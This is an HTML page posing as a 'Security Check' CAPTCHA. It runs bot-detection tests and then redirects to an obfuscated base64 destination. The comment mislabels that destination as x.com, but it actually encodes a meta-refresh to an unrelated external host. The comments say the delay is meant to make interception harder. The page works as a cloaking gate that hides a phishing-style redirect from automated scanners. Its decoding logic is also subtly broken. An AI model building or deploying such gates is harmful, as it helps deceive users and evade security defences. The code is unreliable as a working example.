<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Human Verification</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
      background: #f9f9f9;
    }
    input, button {
      font-size: 16px;
      padding: 10px;
      margin-top: 10px;
    }
    #redirect-message {
      display: none;
      font-weight: bold;
      color: green;
    }
  </style>
</head>
<body>
  <h2>Security Check</h2>
  <p id="captcha-question">Loading CAPTCHA...</p>
  <input type="number" id="captcha-answer" placeholder="Your answer">
  <br>
  <button onclick="submitCaptcha()">Verify & Continue</button>
  <p id="redirect-message">Redirecting...</p>

  <script>
    // ðŸ‘‡ PLACE YOUR BASE64 URL HERE
    let ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vd29ya2luZ3dva2Vycy5mZW5tZW5vcy5kZS9iYzBRUCUyMiUyMC8lM0U="; // Base64 for https://x.com

    // CAPTCHA and bot detection
    let num1, num2;
    let mouseMoved = false;
    const startTime = Date.now();

    // Detect mouse movement
    window.addEventListener("mousemove", () => {
      mouseMoved = true;
    });

    // Basic behavioral & environment check
    function isHumanLike() {
      return (
        navigator.userAgent.length > 20 &&
        'language' in navigator &&
        'platform' in navigator &&
        screen.width > 0 &&
        screen.height > 0 &&
        window.innerWidth > 0 &&
        typeof window.DeviceOrientationEvent !== 'undefined'
      );
    }

    // CAPTCHA generator
    function generateCaptcha() {
      num1 = Math.floor(Math.random() * 10) + 1;
      num2 = Math.floor(Math.random() * 10) + 1;
      document.getElementById("captcha-question").innerText = `What is ${num1} + ${num2}?`;
    }

    // Submit handler
    function submitCaptcha() {
      const answer = parseInt(document.getElementById("captcha-answer").value, 10);
      const elapsed = Date.now() - startTime;

      if (
        mouseMoved &&
        isHumanLike() &&
        answer === (num1 + num2) &&
        elapsed > 1500
      ) {
        document.getElementById("redirect-message").style.display = "block";

        // Short delay before redirect to make it harder to intercept in real-time
        setTimeout(() => {
          try {
            const url = atob(ref);
            if (url.startsWith("http")) {
              window.location.href = url;
            } else {
              alert("Invalid redirect link.");
            }
          } catch (err) {
            alert("Error decoding the redirect URL.");
          }
        }, 1000);
      } else {
        alert("Failed verification. Try again.");
        document.getElementById("captcha-answer").value = "";
        generateCaptcha();
      }
    }

    window.onload = generateCaptcha;
  </script>
</body>
</html>
